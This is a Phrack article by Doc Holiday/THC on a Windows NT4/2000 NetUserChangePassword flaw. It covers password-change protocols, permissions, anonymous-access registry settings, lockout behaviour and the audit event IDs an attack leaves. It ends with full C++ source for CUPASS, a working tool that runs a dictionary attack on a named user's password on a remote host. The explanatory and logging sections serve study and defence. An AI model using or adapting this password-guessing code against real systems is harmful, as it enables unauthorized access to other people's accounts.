@@ -1,0 +1,808 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x39, Phile #0x10 of 0x12
+
+|=---------=[ CUPASS AND THE NETUSERCHANGEPASSWORD PROBLEM ]=------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------=[ Doc Holiday / THC <holiday@thc.org> ]=----------------=|
+
+
+
+----|  INTRODUCTION
+
+
+
+Microsoft has a known problem in Windows NT 4, that enables an attacker
+to change the password of any user under special/default circumstances.
+
+
+The same problem reappeared in Windows 2000 some days ago. The flaw exists
+in Microsofts implementation of the NetUserChangePassword function.
+
+
+These facts inspired me to write this article and CUPASS, a simple tool 
+that starts a dictionary attack against user accounts. 
+
+
+In this article I want to discuss all things worth knowing about the 
+NetUserChangePassword problem.
+
+
+Have fun while reading this article...
+
+
+Doc Holiday /THC
+
+
+
+
+----| THE PASSWORD CHANGE PROTOCOLS
+
+
+As a little background I will tell you something about the possibilites
+to change a password in a Windows NT/W2K environment.
+
+
+Windows 2000 supports several protocols for changing passwords which
+are used under different circumstances. 
+
+
+These protocols are 
+
+
+- NetUserChangePassword protocol (we will call it NUCP)
+- NetUserSetInfo protocol
+- Kerberos change-password protocol
+- Kerberos set-password protocol
+- LDAP write-password attribute (presumes 128Bit SSL)
+- XACT-SMB protocol (for LAN Manager compatibility)
+
+
+Because there is a flaw in Microsofts implementation of the NUCP protocol,
+we will have a deeper look at this one.
+
+
+
+----| PROTOCOL ELECTION
+
+
+We can see that there are a lot of protocols for changing passwords in an 
+Microsoft environment. Now I will show in which cases the NUCP is used:
+
+
+case 1
+------
+
+
+If a user changes his password by pressing CTRL+ALT+DELETE and pressing the 
+"Change Password" button, the NUCP protocol is used, if the target is a
+domain or the local member server or workstation.
+
+
+If the target is a Kerberos realm, the Kerberos change-password protocol is 
+used instead of NUCP.
+
+
+case 2
+------
+
+
+If a change password request is initiated from an Windows NT 3.x or NT 4
+machine, the NUCP and/or NetUserSetInfo protocols are used.
+
+
+case 3
+------
+
+
+If a program uses the NUCP method on the Active Directory Services
+Interface (ADSI), the IaDSUser interface first tries to change the
+password with the LDAP protocol, and then by using the NUCP method.
+
+
+
+
+----| NUCP FUNCTION CALL
+
+
+At this time we know that a lot of ways exist to change a users 
+password. We also know in which cases NUCP is used.
+
+
+Now we want to have a little look at the function NetUserChangePassword
+itself. (More detailed information can be found at Microsoft's SDK!)
+
+
+
+Prototype
+---------
+
+
+The prototype of the NetUserChangePassword function is defined in
+"lmaccess.h", and looks as follows:
+
+
+
+NET_API_STATUS NET_API_FUNCTION
+NetUserChangePassword (
+    IN  LPCWSTR   domainname OPTIONAL,
+    IN  LPCWSTR   username OPTIONAL,
+    IN  LPCWSTR   oldpassword,
+    IN  LPCWSTR   newpassword
+    );
+
+
+
+The parameters are explained consecutively:
+
+
+
+Parameters
+----------
+
+
+->domainname
+  ----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the name of a 
+  remote server or domain. 
+
+
+->username
+  --------
+
+
+  Pointer to a null-terminated Unicode string that specifies a user name. 
+
+
+->oldpassword
+  -----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the user's
+  old password on the server or domain. 
+
+
+->newpassword
+  -----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the user's new
+  password on the server or domain.  
+
+
+
+Return values
+-------------
+
+
+The return values are defined in "LMERR.H" and "WINERROR.H".
+
+
+With a deeper look in this files we can see that if the function was executed
+with success, the return value is 0 (zero) btw. NERR_Success.
+
+
+
+The most important error values are:
+
+
+->ERROR_ACCESS_DENIED (WINERROR.H)
+  --------------------------------
+
+
+  Access is denied ;)
+
+
+  If the target is a NT Server/Domain Controller, and the
+  option "User Must Log On in Order to Change Password" is enabled,
+  this error code is the result of CUPASS. The password could
+  not be guessed :(
+
+
+  If the target is a W2K domain controller with AD installed,
+  and the EVERYONE group is removed from the group
+  "Pre-Windows 2000 compatible access", than this error code
+  is an result of NUCP.
+
+
+  In some cases this means the right password was guessed by
+  CUPASS, but could not be changed because of insufficient
+  permissions on the corresponding AD object.
+
+
+
+->ERROR_INVALID_PASSWORD (WINERROR.H)
+  -----------------------------------
+
+
+  The guessed password (oldpassword) was invalid
+
+
+
+->ERROR_ACCOUNT_LOCKED_OUT (WINERROR.H)
+  -------------------------------------
+
+
+  The account is locked due to many logon tries.
+
+
+
+->ERROR_CANT_ACCESS_DOMAIN_INFO (WINERROR.H)
+  ------------------------------------------
+
+
+  Indicates a Windows NT Server could not be contacted or that
+  objects within the domain are protected such that necessary
+  information could not be retrieved.
+
+
+
+->NERR_UserNotFound (LMERR.H)
+  ---------------------------
+
+
+  The useraccount could not be found on the given server.
+
+
+
+->NERR_NotPrimary (LMERR.H)
+  -------------------------
+
+
+  The operation is only allowed on the PDC. This appears e.g. if 
+  you try to change passwords on a BDC.
+
+
+
+This return values are evaluated by CUPASS. For all others, the numeric
+value will be shown, and you can simply have a look at this files for 
+the meaning of the errorcode.
+
+
+
+
+MORE DETAILS ON NUCP API CALL
+-----------------------------
+
+
+The NUCP function is only available on Windows NT and Windows 2000
+platforms.
+
+
+As part of the LanMan-API the NUCP function is UNICODE only!!! 
+This makes the programming a little bit harder, but not impossible :)
+
+
+UNICODE on Windows is an topic for itself, and we dont want to talk more
+about it here. Have a look at Microsofts msdn webpage or Charles
+Petzolds book about Windows programming, if you are interested in this
+topic.
+
+
+For a successfull usage of NUCP, you have to link your program with the 
+"Netapi32.lib" library!
+
+
+
+
+----| REQUIRED PERMISSIONS FOR NUCP 
+
+
+NUCP is part of the Microsoft network management functions.
+The management functions consists of different groups like
+NetFileFunctions, ScheduleFunctions, ServerFunctions, UserFunctions etc.
+
+
+These functions are again splitted in Query Functions and Update Functions. 
+Whilst query functions just allow to query informations, the update
+functions allow changes on objects.
+
+
+An example for a query function is e.g the NetUserEnum function which
+provides information about all user accounts on a server. 
+
+
+An example for an update function is the NetUserChangePassword function
+which changes the password of a user account :)
+
+
+Its easy to imagine, that query functions need less permissions than update
+functions for beeing executed.
+
+
+
+Lets have a look what permissions are needet:
+
+
+
+WINDOWS NT
+----------
+
+
+The query functions like NetGroupEnum, NetUserEnum etc. and can be
+executed by all authenticated users.
+
+
+This includes Anonymous users, if the RestrictAnonymous policy setting
+allows anonymous access.
+
+
+On a Windows NT member server, workstation or PDC, the
+NetUserChangePassword function can only be (successfull) executed by
+Administrators, Account Operators or the user of the account, if the option
+'User Must Log On in Order to Change Password' for this user is enabled.
+
+
+If 'User Must Log On in Order to Change Password'  is not enabled, a user can
+change the password of any other user, as long he knows the actual password.
+
+
+
+WINDOWS 2000
+------------
+
+
+The query functions like NetGroupEnum, NetUserEnum etc. can be executed by
+all authenticated users. This includes Anonymous users, if the
+RestrictAnonymous policy setting allows anonymous access.
+
+
+On a W2K member server or workstation the NetUserChangePassword function
+should only be (successfully) executable by Administrators, Account
+Operators or the user of the account.
+
+
+That this isn't the case, can be shown with CUPASS, because here is the
+flaw that Microsoft made with his implementation of NetUserChangePassword.
+
+
+On W2K member servers and workstations, the NetUserChangePassword function
+can be successfully executed by any user who knows the current password of
+the attacked user account.
+
+
+
+( For your information:
+
+
+The option 'User Must Log On in Order to Change Password' has been removed
+>from W2K! )
+
+
+
+On a W2K domain controller with Active Directory, access to an object is
+granted based on the ACL of the object (Because W2K with installed AD
+stores the user passwords in the AD in contrast to NT 3.x/4).
+
+
+Network management query functions are permitted to all authenticated
+users and the members of the group "Pre-Windows 2000 compatible access"
+by the default ACL's.
+
+
+Theoretical Network Management Update functions like NUCP are only
+permitted to Administrators and Account Operators.
+
+
+That this is not the case, can also be shown with CUPASS.
+
+
+CUPASS works fine if AD is installed on the target system.
+
+
+If the "everyone" group is removed from the
+"Pre-Windows 2000 compatible access" group, the result of CUPASS will
+be Errorcode 5, which means ACCESS_DENIED!.
+
+
+My research shows that anyhow the password is guessed by CUPASS, but
+can not be changed because of insufficient permissions on the AD object!
+
+
+
+----| ANONYMOUS CONNECT
+
+
+There is something I didn't talk about much, the Anonymous User Problem,
+also known as the NULL-User problem.
+
+
+Lets have a short look at how the Anonymous security settings will take affect
+to the NUCP problem:
+
+
+-> W2K
+   ---
+
+
+   The value Data of the following registry value regulates the behaviour
+   of the operating system regarding to the NULL USER CONNECT.
+
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
+   Value: RestrictAnonymous
+   Value Type: REG_DWORD
+
+
+   If RestrictAnonymous is set to 0 (zero), which is the default setting,
+   CUPASS will work properly.
+
+
+   If RestrictAnonymous is set to 1, what means the enumeration of SAM
+   accounts and names is not allowed, CUPASS will work properly.
+  
+   If RestrictAnonymous is set to 2, what means no access without explicit
+   anonymous permissions, there is no possibility to change the password
+   with NUCP :(
+   
+   Because the value 2 has comprehensive consequences to the behaviour of
+   the windows environment (e.g. Browser service will not work properly,
+   netlogon secure channels could not be established properly by member
+   workstations etc..) it is rare used. 
+
+
+   These settings are the same on W2K member server and W2K DC with AD!
+
+
+
+-> NT4
+   ---
+ 
+   The value Data of the following registry value regulates the behaviour
+   of the operating system regarding to the NULL USER CONNECT.
+
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
+   Value: RestrictAnonymous
+   Value Type: REG_DWORD
+
+
+   Converse to W2K there are only two valid values 0 (zero) and 1 for
+   RestrictAnonymous.
+
+
+   If RestrictAnonymous is set to 0 (zero), which is the default setting,
+   CUPASS will work properly.
+
+
+   If RestrictAnonymous is set to 1, what means the enumeration of SAM
+   accounts and names is not allowed, CUPASS will work properly.
+
+
+
+
+
+
+COMMON
+------
+
+
+The process that calls the NetUserChangePassword function in some cases
+must have the SE_CHANGE_NOTIFY_NAME privilege
+(except for system account and members of the local Administrator group).
+Per default this privilege is enabled for every account, but can be
+disabled by the administrator.
+
+
+SE_CHANGE_NOTIFY_NAME could not be found at the privileges,
+because it is called "Bypass traverse checking"!
+
+
+This is an declarative from Microsoft. I tried it, but I didn't find a case
+in that this right was necessary to execute the NUCP function call.
+
+
+
+
+----| POLICY AND LOGGING
+
+
+I will have a look for the policy settings, that will take affect to the
+NUCP problem.
+
+
+
+ACCOUNT POLICIES
+----------------
+
+
+->PASSWORD POLICY
+  ---------------
+  
+  The settings "Enforce password history" and  "Minimum password age"
+  will take effect to the result of CUPASS, in the way that CUPASS can't
+  "realy" change the password, and the error code 2245 will result. 
+ 
+  But this doesn't matter, because we know the "old" password at this time,
+  and CUPASS just tried to replace the "old" password with the "old"
+  password again.
+    
+
+
+->ACCOUNT LOGOUT POLICY
+  ---------------------
+ 
+  Account lockout treshold
+  ------------------------
+
+
+  The settings "Account lockout duration" and
+  "Reset Account lockout after ..." are only relevant if the
+  "Account lockout treshold" ist set to any value >0.
+
+
+  If the treshold is set, than this takes affect to the work of CUPASS,
+  because all attempts of CUPASS exceeding the treshold will lead to an
+  account lockout :(
+
+
+  However the Logout Policy ist not valid for the Administrator on NT4
+  environments, until the NT Reskit tool "Passprop" is used!
+  In this case even the Administator account will be locked
+  for network logons!
+
+
+  If we start CUPASS against any account of a W2K server or a W2K domain
+  controller with AD, this account is locked out, and even the
+  Administrator account is marked as "Account is locked out", too !
+
+
+  But it is still possible for the Administrator account to log on
+  interactive on the machine!
+
+
+  
+  
+
+
+
+AUDIT POLICY
+------------
+
+
+  Lets have a look which auditing events have to enabled, to see an
+  CUPASS attack in the security logs of the target machine.
+
+
+  
+  Audit Account Management
+  ------------------------
+
+
+  If the setting "Audit Account Management" is enabled (success/failure),
+  an entry with the ID 627 appears in in the security log.
+
+
+  This entry contains all necessary datas for the administrator :(
+  These e.g. are: Date, Time, Target Account Name, Caller User Name etc.
+
+
+  
+  Audit account logon events
+  --------------------------
+
+
+  Surprisingly for some administrators, there appears no log entry if
+  the settings "Audit account logon events" or "Audit logon events"
+  are enabled, if the attack goes to the local machine.
+
+
+  This is e.g. the case if you want to guess the local administrator
+  password of your machine.
+
+
+  If the CUPASS attack comes from remote, log entries ID 681 and ID 529
+  occures.
+
+
+
+  Audit Object Access
+  -------------------
+  
+  If this type of auditing is enabled, and the attack goes to the
+  local machine, an logfile entry with the ID 560 and 562 appears.
+
+
+  ID 560 tells us that someone opened the object
+  "Security Account Manager" whilst 562 tells us something like
+  "Handle closed"...
+
+
+
+Maybe there occure some more logfile entries with other ID's, but these
+ones listed above are the ones I found while testing CUPASS.
+
+
+So test CUPASS on your own environment and have a look into your logfiles!
+
+
+
+
+----| LAST WORDS
+
+
+I hope this article could give you a little overview about the
+NetUserChangePassword problem, and Microsoft's inconsequent implementation
+of security and function calls.
+
+
+This article could not treat this topic concluding, because there are
+so many different situations and configurations that I could not test
+in my short sparetime :)
+
+
+
+----| GREETS
+
+
+Greets to Van Hauser who inspired me for this release, ganymed, mindmaniac
+and all the other members from THC, VAX who gives me a lift to HAL2001,
+the guys from TESO, Seth, Rookie and all the other people knowing me...
+
+
+The biggest THANX are going to my wife, who missed me nearly the whole
+weekend while I was writing this article!
+ 
+Ok, have a nice day and lets meet and party at HAL2001 :)
+
+
+
+<++> cupass.cpp !a10c7302
+/*
+ * CUPASS v1.0 (c) 2001 by Doc Holiday / THC <Holiday@thc.org>
+ * http://www.hackerschoice.com
+ *
+ * Dictionary Attack against Windows Passwords with NetUserChangePassword.
+ * Do only use for legal purposes.
+ * 
+ * Compiled and tested on Windows NT/W2K - runs not on Win9x!!
+ * Compiled with VC++ 6.0
+ *
+ */
+
+
+#define UNICODE 1
+#define _UNICODE 1
+
+
+#include <windows.h>
+#include <lmaccess.h>
+#include <stdio.h>
+#include <wchar.h>
+
+
+#pragma comment( lib, "netapi32.lib" )
+
+
+
+void wmain( int argc, wchar_t *argv[] )
+{
+        wchar_t *hostname = 0; 
+        wchar_t *username = 0; 
+        wchar_t *dictfile = 0; 
+        wchar_t myChar[256];
+        NET_API_STATUS result;
+        FILE *stream;
+        LPWSTR oldpassword; 
+
+
+        if (argc != 4)
+        { 
+        wprintf (L"\nMissing or wrong parameters!\n"); 
+            wprintf (
+               L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
+            exit(1);
+        }
+
+
+        hostname = argv[1];
+        username = argv[2];
+        dictfile = argv[3];
+
+
+    if (wcsncmp(hostname, L"\\\\",2 )!=0)
+        {
+            wprintf (L"\nups... you forgot the double backslash?");
+            wprintf (
+                L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
+            exit(1);
+        }
+
+
+  if( (stream  = _wfopen( dictfile, L"r" )) == NULL )
+        {
+      wprintf( L"\nups... dictionary %s could not be opened", dictfile );
+      wprintf (L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
+        }
+   else
+   {
+        
+        wprintf (L"\n*** CUPASS 1.0 - Change User PASSword - by Doc Holiday/THC (c) 2001 ***\n");
+        wprintf (L"\nStarting attack .....\n");
+        wprintf (L"\nTarget: %s ", hostname);
+        wprintf (L"\nUser: %s\n ", username);
+
+
+        while( !feof( stream ) )
+        {
+          fgetws (myChar, 256,stream);
+
+
+          if (myChar[wcslen(myChar)-1] == '\r') myChar[wcslen(myChar)-1] = '\0';
+          if (myChar[wcslen(myChar)-1] == '\n') myChar[wcslen(myChar)-1] = '\0';
+
+
+          oldpassword = myChar;
+   
+          wprintf( L"\nTrying password %s \n", oldpassword );
+                
+          result = NetUserChangePassword( hostname, username,oldpassword, oldpassword );
+                
+          switch (result)
+          {
+                case 0: 
+                        wprintf( L"GOTCHA!! Password was changed\n" );
+                        wprintf( L"\nPassword from user '%s' is '%s'\n", username, oldpassword);
+                        fclose (stream);
+                        exit (1);
+                        break;
+                        
+                case 5: //ERROR_ACCESS_DENIED
+                        wprintf (L"Attempt failed -> ERROR_ACCESS_DENIED - But password could be %s\n", oldpassword);
+                        fclose (stream);
+                        exit(1);
+                        break;
+                        
+                case 86: //ERROR_INVALID_PASSWORD
+                        wprintf( L"Attempt failed -> Incorrect password\n" );
+                        break;
+                        
+                case 1351: //ERROR_CANT_ACCESS_DOMAIN_INFO 
+                        wprintf (L"Attempt failed -> Can't establish connection to Host %s\n",hostname);
+                        fclose (stream);
+                        exit(1);
+                        break;
+
+
+                case 1909: //ERROR_ACCOUNT_LOCKED_OUT
+                        wprintf (L"Attempt failed -> Account locked out\n");
+                        fclose (stream);
+                        exit(1);
+                        break;
+
+
+                case 2221: //NERR_UserNotFound) 
+                        wprintf (L"Attempt failed -> User %s not found\n", username);
+                        fclose (stream);
+                        exit(1);                   
+                        break;
+                        
+                case 2226://NERR_NotPrimary
+                        wprintf (L"Attempt failed -> Operation only allowed on PDC\n");
+                        break;
+
+
+                case 2245:
+                        wprintf (L"GOTCHA!! Password is '%s' , but couldn't be changed to '%s' due to password policy settings!\n", oldpassword, oldpassword);
+                        fclose(stream);
+                        exit(1);
+                        break;
+
+
+                default:
+                        wprintf( L"\nAttempt failed :( %lu\n", result );
+                        fclose(stream);
+                        exit(1);
+                        break;
+                }
+        }
+        fclose (stream); 
+   }    
+}
+<--> end cupass.cpp
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
